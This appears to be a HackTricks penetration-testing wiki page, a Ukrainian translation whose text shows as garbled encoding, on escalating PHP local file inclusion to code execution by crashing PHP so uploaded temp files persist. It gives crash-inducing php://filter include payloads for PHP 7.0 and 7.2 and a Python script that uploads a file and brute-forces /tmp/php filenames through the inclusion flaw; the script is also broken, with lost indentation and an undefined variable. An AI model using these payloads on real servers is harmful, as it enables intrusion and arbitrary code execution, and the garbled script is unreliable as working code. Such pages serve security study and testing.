# LFI2RCE via Segmentation Fault

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

–ó–≥—ñ–¥–Ω–æ –∑ –æ–ø–∏—Å–∞–º–∏ [https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/) (–¥—Ä—É–≥–∞ —á–∞—Å—Ç–∏–Ω–∞) —Ç–∞ [https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view), –Ω–∞—Å—Ç—É–ø–Ω—ñ payloads –≤–∏–∫–ª–∏–∫–∞–ª–∏ segmentation fault —É PHP:
```php
// PHP 7.0
include("php://filter/string.strip_tags/resource=/etc/passwd");

// PHP 7.2
include("php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA");
```
–í–∞–º —Å–ª—ñ–¥ –∑–Ω–∞—Ç–∏, —â–æ —è–∫—â–æ –≤–∏ **–Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ** **POST** –∑–∞–ø–∏—Ç **–∑ —Ñ–∞–π–ª–æ–º**, PHP —Å—Ç–≤–æ—Ä–∏—Ç—å **—Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª —É `/tmp/php<—â–æ—Å—å>`** –∑ –≤–º—ñ—Å—Ç–æ–º —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É. –¶–µ–π —Ñ–∞–π–ª –±—É–¥–µ **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–¥–∞–ª–µ–Ω–∏–π** –ø—ñ—Å–ª—è –æ–±—Ä–æ–±–∫–∏ –∑–∞–ø–∏—Ç—É.

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **LFI** —ñ –∑–º–æ–∂–µ—Ç–µ **–≤–∏–∫–ª–∏–∫–∞—Ç–∏** —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ–π–Ω—É –ø–æ–º–∏–ª–∫—É –≤ PHP, **—Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª –Ω—ñ–∫–æ–ª–∏ –Ω–µ –±—É–¥–µ –≤–∏–¥–∞–ª–µ–Ω–∏–π**. –¢–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ **—à—É–∫–∞—Ç–∏** –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ **LFI**, –ø–æ–∫–∏ –Ω–µ –∑–Ω–∞–π–¥–µ—Ç–µ –π–æ–≥–æ —ñ –Ω–µ –≤–∏–∫–æ–Ω–∞—î—Ç–µ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±—Ä–∞–∑ docker [https://hub.docker.com/r/easyengine/php7.0](https://hub.docker.com/r/easyengine/php7.0) –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è.
```python
# upload file with segmentation fault
import requests
url = "http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd"
files = {'file': open('la.php','rb')}
response = requests.post(url, files=files)


# Search for the file (improve this with threads)
import requests
import string
import threading

charset = string.ascii_letters + string.digits

host = "127.0.0.1"
port = 80
base_url = "http://%s:%d" % (host, port)


def bruteforce(charset):
for i in charset:
for j in charset:
for k in charset:
for l in charset:
for m in charset:
for n in charset:
filename = prefix + i + j + k
url = "%s/index.php?i=/tmp/php%s" % (base_url, filename)
print url
response = requests.get(url)
if 'spyd3r' in response.content:
print "[+] Include success!"
return True


def main():
bruteforce(charset)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
